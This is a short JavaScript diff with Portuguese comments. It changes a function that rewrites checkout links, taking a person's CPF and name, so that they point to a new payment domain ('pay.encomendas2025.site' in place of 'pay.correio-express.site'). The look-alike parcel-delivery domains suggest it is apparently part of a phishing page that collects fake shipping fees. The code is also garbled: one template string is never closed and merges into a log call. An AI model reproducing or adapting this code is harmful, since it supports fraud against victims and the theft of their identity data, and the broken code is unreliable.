@@ -83,11 +83,11 @@ document.addEventListener("DOMContentLoaded", () => {
     // Função para atualizar os links de checkout
     function atualizarLinksCheckout(cpf, nome) {
         const encodedName = (nome);
-        const checkoutLinks = document.querySelectorAll('a[href*="https://pay.correio-express.site/lDW0ZaVJQb6GN7E"]'); // Seletor mais genérico
+        const checkoutLinks = document.querySelectorAll('a[href*="https://pay.encomendas2025.site/lDW0ZaVJQb6GN7E"]'); // Seletor mais genérico
 
         if (checkoutLinks.length > 0) {
             checkoutLinks.forEach(link => {
-                link.href = `https://pay.correio-express.site/lDW0ZaVJQb6GN7E('Link de checkout atualizado:', link.href);
+                link.href = `https://pay.encomendas2025.site/lDW0ZaVJQb6GN7E('Link de checkout atualizado:', link.href);
             });
         } else {
             console.error('Nenhum link de checkout encontrado.');
